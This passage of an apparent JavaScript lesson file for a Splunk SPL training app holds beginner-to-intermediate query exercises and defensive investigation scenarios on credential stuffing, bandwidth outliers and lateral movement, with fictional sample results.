                    explanation: 'The stats command aggregates all events. "count" counts the number of events in each group. "by status" creates groups for each unique status code value.'
                },
                variations: [
                    {
                        description: 'Now count requests by status AND method (GET, POST, etc.):',
                        spl: 'index=web | stats count by status, method'
                    },
                    {
                        description: 'Count how many UNIQUE users got each status code:',
                        spl: 'index=web | stats dc(user) as unique_users by status'
                    }
                ]
            }
        },
        {
            id: 'found-005',
            title: 'Filter by Field Values',
            type: 'challenge',
            difficulty: 'beginner',
            duration: '10 min',
            objectives: [
                'Use the where command for filtering',
                'Apply comparison operators',
                'Combine multiple conditions'
            ],
            tags: ['basics', 'filtering', 'where'],
            description: 'Master the art of filtering events to find exactly what you need.',
            content: {
                problem: 'Find all firewall events where bytes_out is greater than 1MB (1048576 bytes) AND the destination port is NOT 80 or 443.',
                hints: [
                    'Use the where command after retrieving events',
                    'Greater than is just > in SPL',
                    'NOT IN checks if value is not in a list'
                ],
                solution: {
                    spl: 'index=firewall | where bytes_out > 1048576 AND dest_port NOT IN (80, 443)',
                    explanation: 'The where command evaluates each event. We check bytes_out exceeds 1MB AND the destination port is neither 80 (HTTP) nor 443 (HTTPS). This could indicate large data transfers over unusual ports.'
                },
                variations: [
                    {
                        description: 'Find events where bytes_out is more than 10x bytes_in (asymmetric traffic):',
                        spl: 'index=firewall | where bytes_out > (bytes_in * 10)'
                    },
                    {
                        description: 'Find connections lasting longer than 1 hour (3600 seconds):',
                        spl: 'index=firewall | where duration > 3600'
                    }
                ]
            }
        },
        {
            id: 'found-010',
            title: 'Formatting Results with Table and Fields',
            type: 'challenge',
            difficulty: 'beginner',
            duration: '10 min',
            objectives: [
                'Select specific fields for output',
                'Rename fields for clarity',
                'Remove unwanted fields and control display order'
            ],
            tags: ['basics', 'table', 'fields', 'output', 'rename'],
            description: 'Learn to present your search results clearly using table, fields, and rename.',
            content: {
                problem: 'You\'ve found suspicious VPN logins and need to create a clean report for your manager. Starting with VPN events, create a table showing: the time (formatted nicely), username, source country, source IP, and connection duration in minutes. Rename the columns to be human-readable.',
                hints: [
                    'Use | table to select and order specific fields',
                    'Use | rename to change field names (rename old AS new)',
                    'Use | eval to format time with strftime() and calculate duration',
                    'The fields command can also remove unwanted fields with a minus sign'
                ],
                solution: {
                    spl: `index=vpn action=connect
| eval login_time = strftime(_time, "%Y-%m-%d %H:%M")
| eval duration_min = round(duration / 60, 1)
| table login_time, user, src_country, src_ip, duration_min
| rename login_time AS "Login Time", user AS "Username", src_country AS "Country", src_ip AS "Source IP", duration_min AS "Duration (min)"`,
                    explanation: 'First, we format the timestamp and calculate duration in minutes using eval. Then table selects exactly which fields to show and in what order. Finally, rename gives each column a business-friendly name for the report.'
                },
                variations: [
                    {
                        description: 'Keep only specific fields and remove all others (for performance):',
                        spl: 'index=firewall | fields src_ip, dest_ip, dest_port, action, bytes_out | head 100'
                    },
                    {
                        description: 'Remove specific fields while keeping everything else:',
                        spl: 'index=web | fields - _raw, _time, linecount, splunk_server | head 100'
                    },
                    {
                        description: 'Rename multiple fields in one command:',
                        spl: 'index=firewall | stats sum(bytes_in) as bytes_in, sum(bytes_out) as bytes_out by src_ip | rename bytes_in AS "Bytes Received", bytes_out AS "Bytes Sent", src_ip AS "Source IP"'
                    },
                    {
                        description: 'Combine sort, head, and table for a "Top N" report:',
                        spl: 'index=web status>=400 | stats count as errors by uri_path, status | sort -errors | head 10 | rename uri_path AS "URL Path", errors AS "Error Count", status AS "HTTP Status"'
                    }
                ]
            }
        },
        {
            id: 'found-011',
            title: 'Where vs Search: Choosing the Right Filter',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '15 min',
            objectives: [
                'Understand when to use search vs where',
                'Avoid common filtering mistakes',
                'Write efficient filters for each situation'
            ],
            tags: ['basics', 'where', 'search', 'filtering', 'performance'],
            description: 'Learn when to use the search command vs the where command - a common source of confusion.',
            content: {
                sections: [
                    {
                        title: 'Two Ways to Filter',
                        body: `<p>SPL has two main filtering commands:</p>
                        <ul>
                            <li><code>search</code> - Filter using search syntax (field=value, wildcards, AND/OR/NOT)</li>
                            <li><code>where</code> - Filter using eval expressions (comparisons, functions)</li>
                        </ul>
                        <p>They often give the same results, but they work differently and have different strengths.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Use search For: Simple Matching',
                        body: `<p>The <code>search</code> command excels at:</p>
                        <ul>
                            <li>Field=value matching</li>
                            <li>Wildcard patterns</li>
                            <li>Case-insensitive text</li>
                            <li>Boolean logic (AND, OR, NOT)</li>
                        </ul>`,
                        spl: 'index=web status=404 uri_path="/api/*" NOT host=test*',
                        explanation: 'Simple field matching with wildcards - search handles this naturally.'
                    },
                    {
                        title: 'Use where For: Comparisons and Functions',
                        body: `<p>The <code>where</code> command excels at:</p>
                        <ul>
                            <li>Numeric comparisons (>, <, >=, !=)</li>
                            <li>Calculations and expressions</li>
                            <li>Function calls (isnull, like, match, cidrmatch)</li>
                            <li>Case-sensitive matching</li>
                        </ul>`,
                        spl: 'index=firewall | where bytes > 1000000 AND duration < 60',
                        explanation: 'Numeric comparisons require where - search can\'t do greater-than.'
                    },
                    {
                        title: 'Key Difference: Case Sensitivity',
                        body: `<p>This trips up many analysts:</p>
                        <ul>
                            <li><code>search</code> is <strong>case-insensitive</strong> by default</li>
                            <li><code>where</code> is <strong>case-sensitive</strong></li>
                        </ul>`,
                        spl: `| makeresults | eval user="Admin"
| search user=admin
| where user="admin"`,
                        explanation: 'search finds "Admin" with user=admin. where does NOT find "Admin" with user="admin" - cases must match!'
                    },
                    {
                        title: 'Key Difference: Null Handling',
                        body: `<p>When a field doesn't exist:</p>
                        <ul>
                            <li><code>search field=*</code> - Finds events where field exists</li>
                            <li><code>where isnotnull(field)</code> - Same result, explicit null check</li>
                            <li><code>where field="value"</code> - Silently excludes nulls</li>
                        </ul>`,
                        spl: 'index=auth | where isnull(error_code) | stats count',
                        explanation: 'Use isnull()/isnotnull() in where to explicitly check for missing fields.'
                    },
                    {
                        title: 'Key Difference: Wildcards',
                        body: `<p>Pattern matching syntax differs:</p>
                        <ul>
                            <li><code>search</code> uses <code>*</code> for wildcards: <code>user=admin*</code></li>
                            <li><code>where</code> uses <code>like()</code> with <code>%</code>: <code>like(user, "admin%")</code></li>
                            <li><code>where</code> also supports <code>match()</code> for regex</li>
                        </ul>`,
                        spl: '... | where like(uri_path, "/api/v%/users/%") OR match(user, "^svc_.*")',
                        explanation: 'where uses SQL-style % wildcards with like() and full regex with match().'
                    },
                    {
                        title: 'Performance Tip',
                        body: `<p>When filtering at the <strong>start</strong> of a search, use search syntax in the initial query - it's optimized at the indexer level:</p>`,
                        spl: `index=web status>=400 host=prod* earliest=-1h
| where response_time > 5000`,
                        explanation: 'Put index, sourcetype, and simple field matches early. Use where for numeric comparisons on extracted fields.'
                    },
                    {
                        title: 'Quick Reference',
                        body: `<table style="width:100%; border-collapse: collapse; margin: 10px 0;">
                            <tr style="background: rgba(255,255,255,0.1);"><td style="padding:8px; border:1px solid #444;"><strong>Need</strong></td><td style="padding:8px; border:1px solid #444;"><strong>Use</strong></td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">field=value (exact match)</td><td style="padding:8px; border:1px solid #444;">search</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Wildcards (user=admin*)</td><td style="padding:8px; border:1px solid #444;">search</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Case-insensitive matching</td><td style="padding:8px; border:1px solid #444;">search</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Numeric comparison (>100)</td><td style="padding:8px; border:1px solid #444;">where</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Function calls (cidrmatch, len)</td><td style="padding:8px; border:1px solid #444;">where</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Check for null</td><td style="padding:8px; border:1px solid #444;">where isnull()</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Regex patterns</td><td style="padding:8px; border:1px solid #444;">where match()</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Calculated conditions</td><td style="padding:8px; border:1px solid #444;">where (bytes/1024 > 100)</td></tr>
                        </table>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'found-012',
            title: 'Time Bucketing and Trends',
            type: 'challenge',
            difficulty: 'beginner',
            duration: '15 min',
            objectives: [
                'Use bin to group events into time buckets',
                'Create trend analysis with timechart',
                'Compare time periods effectively'
            ],
            tags: ['basics', 'timechart', 'bin', 'trends', 'time'],
            description: 'Learn to analyze trends over time using bin and timechart.',
            content: {
                problem: 'Your manager asks: "Are we getting more errors this week compared to last week?" Using web server logs, create a visualization that shows error counts (status >= 400) by hour, so you can compare patterns between the two weeks.',
                hints: [
                    'Use timechart with span=1h to bucket by hour',
                    'timechart count creates a count over time',
                    'The earliest and latest modifiers control your time range',
                    'You can also use bin _time span=1h with stats for more control'
                ],
                solution: {
                    spl: `index=web status>=400 earliest=-14d
| timechart span=1h count as errors`,
                    explanation: 'timechart automatically buckets by time (span=1h) and counts events. The result shows errors per hour over 14 days, making weekly patterns visible.'
                },
                variations: [
                    {
                        description: 'Compare current hour to same hour yesterday:',
                        spl: `index=web status>=400 earliest=-1h
| stats count as current_hour
| appendcols [search index=web status>=400 earliest=-25h latest=-24h | stats count as yesterday_same_hour]
| eval change_pct = round(((current_hour - yesterday_same_hour) / yesterday_same_hour) * 100, 1)`
                    },
                    {
                        description: 'Break down errors by type over time:',
                        spl: 'index=web status>=400 | timechart span=1h count by status'
                    },
                    {
                        description: 'Use bin for more control over grouping:',
                        spl: 'index=web status>=400 | bin _time span=1h | stats count, dc(src_ip) as unique_ips by _time | where count > 100'
                    },
                    {
                        description: 'See hourly pattern by day of week:',
                        spl: 'index=web status>=400 | eval hour=strftime(_time,"%H"), dow=strftime(_time,"%A") | stats count by dow, hour | sort dow, hour'
                    }
                ]
            }
        }
    ],

    coreSkills: [
        {
            id: 'core-001',
            title: 'Mastering Stats',
            type: 'tutorial',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Use multiple aggregation functions',
                'Combine stats with filtering',
                'Create calculated fields in stats'
            ],
            tags: ['stats', 'aggregation', 'analysis'],
            description: 'Deep dive into the stats command - the workhorse of SPL analysis.',
            content: {
                sections: [
                    {
                        title: 'Aggregation Functions',
                        body: `<p>Stats supports many aggregation functions:</p>
                        <ul>
                            <li><code>count</code> - Number of events</li>
                            <li><code>dc(field)</code> - Distinct count of values</li>
                            <li><code>sum(field)</code> - Sum of numeric field</li>
                            <li><code>avg(field)</code> - Average value</li>
                            <li><code>min(field)</code> / <code>max(field)</code> - Extremes</li>
                            <li><code>values(field)</code> - List of all values</li>
                            <li><code>first(field)</code> / <code>last(field)</code> - First/last value</li>
                        </ul>`,
                        spl: 'index=web | stats count, dc(user) as unique_users, avg(response_time) as avg_ms by uri_path',
                        explanation: 'Multiple aggregations on web logs: request count, unique users, and average response time per URL path.'
                    },
                    {
                        title: 'Stats with Expressions',
                        body: `<p>You can use expressions in stats:</p>`,
                        spl: 'index=firewall | stats sum(bytes_in) as total_in, sum(bytes_out) as total_out, sum(eval(bytes_in + bytes_out)) as total_bytes by src_ip',
                        explanation: 'Calculate total inbound, outbound, and combined bytes using eval inside stats.'
                    },
                    {
                        title: 'Percentiles',
                        body: `<p>Use percentiles to understand distributions:</p>`,
                        spl: 'index=web | stats count, avg(response_time) as avg, perc50(response_time) as median, perc95(response_time) as p95, perc99(response_time) as p99 by uri_path | where count > 100',
                        explanation: 'See not just averages but distribution - p95 and p99 reveal outliers that averages hide.'
                    },
                    {
                        title: 'Time-Based Stats',
                        body: `<p>Use earliest() and latest() to capture time ranges:</p>`,
                        spl: 'index=vpn action=* | stats earliest(_time) as first_seen, latest(_time) as last_seen, values(action) as actions, dc(src_ip) as locations by user | eval duration=last_seen-first_seen',
                        explanation: 'Track each VPN user\'s session: when they started, ended, what actions they took, and from how many IPs.'
                    }
                ]
            }
        },
        {
            id: 'core-002',
            title: 'Brute Force Detection',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Detect credential stuffing patterns',
                'Identify distributed attacks',
                'Calculate attack velocity'
            ],
            tags: ['authentication', 'security', 'brute-force'],
            description: 'Investigate a suspected credential stuffing attack against your web application.',
            content: {
                situation: `The web application team reports slow response times. Initial checks show the authentication endpoint is receiving unusual traffic. You suspect credential stuffing - attackers trying stolen username/password combinations.`,
                steps: [
                    {
                        question: 'First, let\'s examine authentication endpoint traffic. What does the failure rate look like?',
                        hint: 'Look at the /api/login endpoint and calculate success vs failure percentages.',
                        spl: 'index=web uri_path="/api/login" | stats count as total, count(eval(status=200)) as success, count(eval(status=401)) as failure | eval failure_rate=round((failure/total)*100, 2)',
                        analysis: 'This calculates the overall success/failure ratio for login attempts.',
                        output: {
                            columns: ['total', 'success', 'failure', 'failure_rate'],
                            rows: [
                                { 'total': '50247', 'success': '3014', 'failure': '47233', 'failure_rate': '94.00' }
                            ]
                        },
                        finding: 'Alarming: 94% failure rate on login attempts (47,000 failures out of 50,000 attempts in the last hour). Normal is ~5%.'
                    },
                    {
                        question: 'That\'s a clear attack. Is it coming from one source or distributed?',
                        hint: 'Count failures by source IP to see the distribution.',
                        spl: 'index=web uri_path="/api/login" status=401 | stats count by src_ip | sort -count | head 20',
                        analysis: 'Shows how failures are distributed across source IPs.',
                        output: {
                            columns: ['src_ip', 'count'],
                            rows: [
                                { 'src_ip': '198.51.100.47', 'count': '487' },
                                { 'src_ip': '203.0.113.22', 'count': '456' },
                                { 'src_ip': '192.0.2.88', 'count': '421' },
                                { 'src_ip': '198.51.100.103', 'count': '398' },
                                { 'src_ip': '203.0.113.156', 'count': '367' }
                            ],
                            truncated: 'Showing 5 of 20 results'
                        },
                        finding: 'Distributed attack: Top 20 IPs each have 200-500 failures. No single IP dominates - this is coordinated.'
                    },
                    {
                        question: 'Let\'s understand the attack pattern. Are they trying many passwords per user, or one password per many users?',
                        hint: 'Compare unique usernames to unique passwords per source IP.',
                        spl: 'index=web uri_path="/api/login" status=401 | stats dc(username) as unique_users, dc(password) as unique_passwords, count as attempts by src_ip | where attempts > 50 | eval ratio=round(unique_users/unique_passwords, 2)',
                        analysis: 'This reveals the attack strategy - credential stuffing typically has high user:password ratios.',
                        output: {
                            columns: ['src_ip', 'unique_users', 'unique_passwords', 'attempts', 'ratio'],
                            rows: [
                                { 'src_ip': '198.51.100.47', 'unique_users': '487', 'unique_passwords': '10', 'attempts': '487', 'ratio': '48.70' },
                                { 'src_ip': '203.0.113.22', 'unique_users': '456', 'unique_passwords': '9', 'attempts': '456', 'ratio': '50.67' },
                                { 'src_ip': '192.0.2.88', 'unique_users': '421', 'unique_passwords': '8', 'attempts': '421', 'ratio': '52.63' }
                            ],
                            truncated: 'Showing 3 of 47 attacking IPs'
                        },
                        finding: 'Credential stuffing confirmed: ratio of ~50 unique users per password. They\'re trying known passwords across many accounts.'
                    },
                    {
                        question: 'Which user accounts are being targeted most heavily? Are any high-value accounts at risk?',
                        hint: 'Count attempts by username and look for patterns.',
                        spl: 'index=web uri_path="/api/login" status=401 | stats count by username | sort -count | head 30',
                        analysis: 'Shows which accounts are receiving the most attempts.',
                        output: {
                            columns: ['username', 'count'],
                            rows: [
                                { 'username': 'admin', 'count': '847' },
                                { 'username': 'administrator', 'count': '823' },
                                { 'username': 'jsmith@company.com', 'count': '156' },
                                { 'username': 'mwilson@company.com', 'count': '142' },
                                { 'username': 'demo@company.com', 'count': '134' },
                                { 'username': 'test', 'count': '98' }
                            ],
                            truncated: 'Showing 6 of 30 results'
                        },
                        finding: 'Top targets include: admin, administrator, test, demo, and several real employee email addresses. The attackers have some internal knowledge.'
                    },
                    {
                        question: 'Critical check - have any of these attacks succeeded? Look for successful logins from attacking IPs.',
                        hint: 'Cross-reference attacking IPs with successful authentication events.',
                        spl: `index=web uri_path="/api/login" status=401 | stats dc(username) as attempts by src_ip | where attempts > 50 | fields src_ip | map search="search index=web uri_path=\\"/api/login\\" status=200 src_ip=$src_ip$ | stats count by username, src_ip"`,
                        analysis: 'Check if any attacking IPs achieved successful logins.',
                        output: {
                            columns: ['username', 'src_ip', 'count'],
                            rows: [
                                { 'username': 'jsmith@company.com', 'src_ip': '198.51.100.47', 'count': '1' },
                                { 'username': 'mwilson@company.com', 'src_ip': '203.0.113.22', 'count': '1' },
                                { 'username': 'demo@company.com', 'src_ip': '192.0.2.88', 'count': '1' }
                            ]
                        },
                        finding: 'CRITICAL: 3 successful logins from attacking IPs! Users jsmith@company.com, mwilson@company.com, and demo@company.com were compromised.'
                    }
                ],
                conclusion: `<strong>Investigation Complete!</strong><br><br>
                    <strong>Attack Type:</strong> Distributed credential stuffing attack from 200+ IPs<br><br>
                    <strong>Impact:</strong> 3 accounts compromised (jsmith, mwilson, demo)<br><br>
                    <strong>Immediate Actions:</strong>
                    <ol>
                        <li>Force password reset for compromised accounts</li>
                        <li>Revoke all active sessions for those users</li>
                        <li>Block attacking IP ranges at WAF</li>
                        <li>Enable rate limiting on /api/login endpoint</li>
                        <li>Review compromised accounts for any malicious activity post-login</li>
                    </ol>`
            }
        },
        {
            id: 'core-003',
            title: 'Find the Outlier',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '20 min',
            objectives: [
                'Establish traffic baselines',
                'Identify statistical anomalies',
                'Investigate unusual patterns'
            ],
            tags: ['network', 'anomaly', 'statistics'],
            description: 'A user reports slow internet - find the bandwidth hog hiding in network traffic.',
            content: {
                situation: `Users in the Finance department report "the internet is slow today." Network team confirms the 1Gbps uplink to their floor is saturated. You need to find what's consuming all the bandwidth.`,
                steps: [
                    {
                        question: 'First, confirm the issue. What\'s the current bandwidth usage from the Finance subnet?',
                        hint: 'Sum up bytes transferred over time from the Finance IP range.',
                        spl: 'index=firewall src_ip="10.20.30.*" | timechart span=5m sum(bytes_out) as bytes_out | eval MB=round(bytes_out/1024/1024, 2)',
                        analysis: 'Shows outbound traffic from Finance in 5-minute windows.',
                        output: {
                            columns: ['_time', 'bytes_out', 'MB'],
                            rows: [
                                { '_time': '2024-01-15 09:00', 'bytes_out': '52428800', 'MB': '50.00' },
                                { '_time': '2024-01-15 09:05', 'bytes_out': '838860800', 'MB': '800.00' },
                                { '_time': '2024-01-15 09:10', 'bytes_out': '891289600', 'MB': '850.00' },
                                { '_time': '2024-01-15 09:15', 'bytes_out': '943718400', 'MB': '900.00' },
                                { '_time': '2024-01-15 09:20', 'bytes_out': '864026624', 'MB': '824.00' }
                            ],
                            truncated: 'Showing 5 of 48 time buckets'
                        },
                        finding: 'Confirmed: Sustained 800+ MB per 5 minutes (roughly 20 Mbps average, with spikes to 50+ Mbps). Normal baseline is ~5 Mbps.'
                    },
                    {
                        question: 'Which specific IP in Finance is responsible for most of this traffic?',
                        hint: 'Aggregate bytes by source IP and find the top consumers.',
                        spl: 'index=firewall src_ip="10.20.30.*" | stats sum(bytes_out) as total_bytes by src_ip | sort -total_bytes | eval GB=round(total_bytes/1024/1024/1024, 2) | head 10',
                        analysis: 'Ranks Finance IPs by total outbound traffic.',
                        output: {
                            columns: ['src_ip', 'total_bytes', 'GB'],
                            rows: [
                                { 'src_ip': '10.20.30.47', 'total_bytes': '48318382080', 'GB': '45.00' },
                                { 'src_ip': '10.20.30.15', 'total_bytes': '2147483648', 'GB': '2.00' },
                                { 'src_ip': '10.20.30.88', 'total_bytes': '1610612736', 'GB': '1.50' },
                                { 'src_ip': '10.20.30.22', 'total_bytes': '1073741824', 'GB': '1.00' }
                            ],
                            truncated: 'Showing 4 of 10 results'
                        },
                        finding: 'Single outlier: 10.20.30.47 has transferred 45GB outbound today. Next highest is 2GB. This IP is the problem.'
                    },
                    {
                        question: 'Where is 10.20.30.47 sending all this data?',
                        hint: 'Look at destination IPs and ports for this source.',
                        spl: 'index=firewall src_ip="10.20.30.47" | stats sum(bytes_out) as bytes, dc(dest_port) as ports by dest_ip | sort -bytes | eval GB=round(bytes/1024/1024/1024, 2) | head 10',
                        analysis: 'Shows where the traffic is going.',
                        output: {
                            columns: ['dest_ip', 'bytes', 'ports', 'GB'],
                            rows: [
                                { 'dest_ip': '185.199.108.133', 'bytes': '21474836480', 'ports': '1', 'GB': '20.00' },
                                { 'dest_ip': '185.199.109.133', 'bytes': '16106127360', 'ports': '1', 'GB': '15.00' },
                                { 'dest_ip': '185.199.110.133', 'bytes': '5368709120', 'ports': '1', 'GB': '5.00' },
                                { 'dest_ip': '10.1.1.50', 'bytes': '1073741824', 'ports': '3', 'GB': '1.00' }
                            ],
                            truncated: 'Showing 4 of 10 results'
                        },
                        finding: 'Bulk of traffic (40GB+) going to 185.199.x.x range - this is a cloud storage provider. Single port 443 suggests HTTPS uploads.'
                    },
                    {
                        question: 'What asset is this? Who owns it?',
                        hint: 'Cross-reference with asset inventory.',
                        spl: 'index=asset_inventory ip="10.20.30.47" | table hostname, department, owner, asset_type',
                        analysis: 'Identify the device and owner.',
                        output: {
                            columns: ['hostname', 'department', 'owner', 'asset_type'],
                            rows: [
                                { 'hostname': 'FIN-WKS-JONES', 'department': 'Finance', 'owner': 'Patricia Jones', 'asset_type': 'Desktop PC' }
                            ]
                        },
                        finding: 'Asset: FIN-WKS-JONES (workstation), Owner: Patricia Jones, Department: Finance, Asset Type: Desktop PC'
                    },
                    {
                        question: 'Is this a data exfiltration attempt? Check what type of application is making these connections.',
                        hint: 'Look at connection patterns - user agent, app signatures, or process info if available.',
                        spl: 'index=firewall src_ip="10.20.30.47" dest_ip="185.199.*" | stats count, sum(bytes_out) as bytes by app_category, app_name | sort -bytes',
                        analysis: 'Identify the application responsible.',
                        output: {
                            columns: ['app_category', 'app_name', 'count', 'bytes'],
                            rows: [
                                { 'app_category': 'cloud-storage', 'app_name': 'Dropbox', 'count': '4827', 'bytes': '42949672960' },
                                { 'app_category': 'web-browsing', 'app_name': 'Chrome', 'count': '156', 'bytes': '52428800' }
                            ]
                        },
                        finding: 'Application identified: "Dropbox" - 40GB uploaded. This is likely an authorized backup or sync, not exfiltration. But the volume is excessive.'
                    }
                ],
                conclusion: `<strong>Investigation Complete!</strong><br><br>
                    <strong>Root Cause:</strong> Patricia Jones (Finance) has Dropbox syncing 40GB+ of data, saturating department bandwidth.<br><br>
                    <strong>Assessment:</strong> Not malicious, but policy violation (personal cloud storage) causing operational impact.<br><br>
                    <strong>Recommended Actions:</strong>
                    <ol>
                        <li>Contact Patricia Jones - understand what's being synced</li>
                        <li>Apply QoS policy to limit cloud storage bandwidth</li>
                        <li>Review DLP policy compliance for synced content</li>
                        <li>Consider department-wide cloud storage policy</li>
                    </ol>`
            }
        },
        {
            id: 'core-004',
            title: 'Top N Analysis',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '10 min',
            objectives: [
                'Combine stats with sorting',
                'Calculate percentages',
                'Create meaningful rankings'
            ],
            tags: ['aggregation', 'ranking', 'analysis'],
            description: 'Find the most significant items in large datasets.',
            content: {
                problem: 'Find the top 10 source IPs by total bytes transferred in firewall logs. Include the percentage of total traffic each IP represents.',
                hints: [
                    'First calculate total bytes per IP with stats',
                    'Use eventstats to get the overall total',
                    'Calculate percentage and sort'
                ],
                solution: {
                    spl: 'index=firewall | stats sum(bytes_out) as bytes by src_ip | eventstats sum(bytes) as total_bytes | eval percentage=round((bytes/total_bytes)*100, 2) | sort -bytes | head 10 | table src_ip, bytes, percentage',
                    explanation: 'We first aggregate bytes per IP, then use eventstats to add the grand total to each row (without collapsing), calculate percentage, sort descending, and take top 10.'
                },
                variations: [
                    {
                        description: 'Find top 10 destination countries by request count with percentage:',
                        spl: 'index=firewall | stats count by dest_country | eventstats sum(count) as total | eval pct=round((count/total)*100, 2) | sort -count | head 10'
                    },
                    {
                        description: 'Find top 10 URLs by error rate (only URLs with 100+ requests):',
                        spl: 'index=web | stats count as total, count(eval(status>=400)) as errors by uri_path | where total >= 100 | eval error_rate=round((errors/total)*100, 2) | sort -error_rate | head 10'
                    }
                ]
            }
        },
        {
            id: 'core-005',
            title: 'Multi-Field Grouping',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '15 min',
            objectives: [
                'Group by multiple dimensions',
                'Analyze patterns across categories',
                'Identify unusual combinations'
            ],
            tags: ['stats', 'analysis', 'patterns'],
            description: 'Learn to analyze data across multiple dimensions simultaneously.',
            content: {
                problem: 'From Windows security logs, find all unique combinations of user, source workstation, and logon type. Show the count for each combination and identify any user logging in from more than 3 different workstations.',
                hints: [
                    'Group by multiple fields with stats count by field1, field2, field3',
                    'Then use stats again to count workstations per user',
                    'Filter to users with 3+ workstations'
                ],
                solution: {
                    spl: 'index=wineventlog EventCode=4624 | stats count by TargetUserName, WorkstationName, LogonType | stats dc(WorkstationName) as unique_workstations, values(WorkstationName) as workstations, sum(count) as total_logins by TargetUserName | where unique_workstations > 3 | sort -unique_workstations',
                    explanation: 'First grouping gets each unique combination with counts. Second grouping collapses by user, counting distinct workstations and preserving the list. Filter to users with anomalous behavior (3+ workstations).'
                },
                variations: [
                    {
                        description: 'Find users who authenticated from more than 2 countries in a day:',
                        spl: 'index=vpn | stats dc(src_country) as countries, values(src_country) as country_list by user | where countries > 2'
                    },
                    {
                        description: 'Find source IPs that connected to more than 50 unique destination IPs (potential scanning):',
                        spl: 'index=firewall | stats dc(dest_ip) as unique_dests, dc(dest_port) as unique_ports by src_ip | where unique_dests > 50 | sort -unique_dests'
                    }
                ]
            }
        }
    ],

    intermediate: [
        {
            id: 'int-001',
            title: 'Subsearch Strategies',
            type: 'tutorial',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Understand when to use subsearches',
                'Master subsearch syntax',
                'Avoid common performance pitfalls'
            ],
            tags: ['subsearch', 'correlation', 'performance'],
            description: 'Learn when and how to use subsearches effectively without destroying performance.',
            content: {
                sections: [
                    {
                        title: 'What is a Subsearch?',
                        body: `<p>A subsearch runs first, returns results, and those results become part of the main search. They're enclosed in square brackets <code>[]</code>.</p>
                        <p>Think of it as: "Find X, then use X to find Y."</p>`,
                        spl: 'index=web [search index=security action=blocked | fields src_ip] | stats count by src_ip, uri_path',
                        explanation: 'Find IPs that were blocked in security logs, then find their web activity.'
                    },
                    {
                        title: 'Subsearch Returns Values',
                        body: `<p>By default, subsearch returns results as OR conditions:</p>
                        <pre>(src_ip="1.2.3.4") OR (src_ip="5.6.7.8")</pre>
                        <p>Use <code>format</code> to control output format. Use <code>return</code> for single values.</p>`,
                        spl: 'index=web status=500 | stats count by src_ip | head 1 | return src_ip',
                        explanation: 'Returns just the IP with the most 500 errors as a single value.'
                    },
                    {
                        title: 'Performance Considerations',
                        body: `<p><strong>Warning:</strong> Subsearches have limits!</p>
                        <ul>
                            <li>Max ~10,000 results (default)</li>
                            <li>Max 60 seconds runtime (default)</li>
                            <li>Results are expanded inline - huge subsearches = huge queries</li>
                        </ul>
                        <p>For large correlations, use <code>join</code> or <code>lookup</code> instead.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Common Patterns',
                        body: `<p><strong>Pattern 1:</strong> Find events related to flagged items</p>`,
                        spl: 'index=web [search index=threats indicator_type=ip | fields indicator_value | rename indicator_value as src_ip]',
                        explanation: 'Find web traffic from IPs in your threat intelligence.'
                    }
                ]
            }
        },
        {
            id: 'int-002',
            title: 'Lateral Movement Hunt',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '30 min',
            objectives: [
                'Trace authentication chains',
                'Identify credential hopping',
                'Map attack paths'
            ],
            tags: ['authentication', 'windows', 'threat-hunting', 'incident-response'],
            description: 'Hunt for lateral movement after a compromised workstation is discovered.',
            content: {
                situation: `Endpoint protection flagged malware on workstation WKS-HR-022 (10.10.50.22). The malware included credential harvesting capabilities. You need to determine if the attacker moved laterally to other systems.`,
                steps: [
                    {
                        question: 'First, identify who was logged into the compromised workstation when the malware was active.',
                        hint: 'Look for logon events (4624) on the compromised system.',
                        spl: 'index=wineventlog EventCode=4624 host="WKS-HR-022" earliest=-24h | stats values(TargetUserName) as users, count by LogonType | sort -count',
                        analysis: 'Shows all users who logged into the compromised workstation.',
                        output: {
                            columns: ['LogonType', 'users', 'count'],
                            rows: [
                                { 'LogonType': '2', 'users': 'jmorgan, admin_jmorgan', 'count': '50' },
                                { 'LogonType': '5', 'users': 'svc_backup', 'count': '12' },
                                { 'LogonType': '3', 'users': 'SYSTEM', 'count': '8' }
                            ]
                        },
                        finding: 'Three users logged in: jmorgan (interactive, 47 times), svc_backup (service, 12 times), and admin_jmorgan (interactive, 3 times). The admin account is concerning.'
                    },
                    {
                        question: 'Those credentials may be compromised. Where else have these accounts authenticated FROM the compromised machine?',
                        hint: 'Look for network logon events (Type 3) where the source is the compromised workstation.',
                        spl: 'index=wineventlog EventCode=4624 LogonType=3 IpAddress="10.10.50.22" | stats count, dc(host) as systems by TargetUserName | sort -systems',
                        analysis: 'Shows accounts used to authenticate TO other systems FROM the compromised workstation.',
                        output: {
                            columns: ['TargetUserName', 'systems', 'count'],
                            rows: [
                                { 'TargetUserName': 'admin_jmorgan', 'systems': '14', 'count': '87' },
                                { 'TargetUserName': 'jmorgan', 'systems': '2', 'count': '5' },
                                { 'TargetUserName': 'svc_backup', 'systems': '1', 'count': '12' }
                            ]
                        },
                        finding: 'admin_jmorgan connected to 14 different systems from the compromised machine. This is highly unusual for a 24-hour period.'
                    },
                    {
                        question: 'Map the admin_jmorgan lateral movement. What systems did they access?',
                        hint: 'Track the authentication events for admin_jmorgan from the compromised source.',
                        spl: 'index=wineventlog EventCode=4624 LogonType=3 IpAddress="10.10.50.22" TargetUserName="admin_jmorgan" | stats earliest(_time) as first, latest(_time) as last, count by host | sort first | table host, first, last, count',
                        analysis: 'Creates a timeline of lateral movement.',
                        output: {
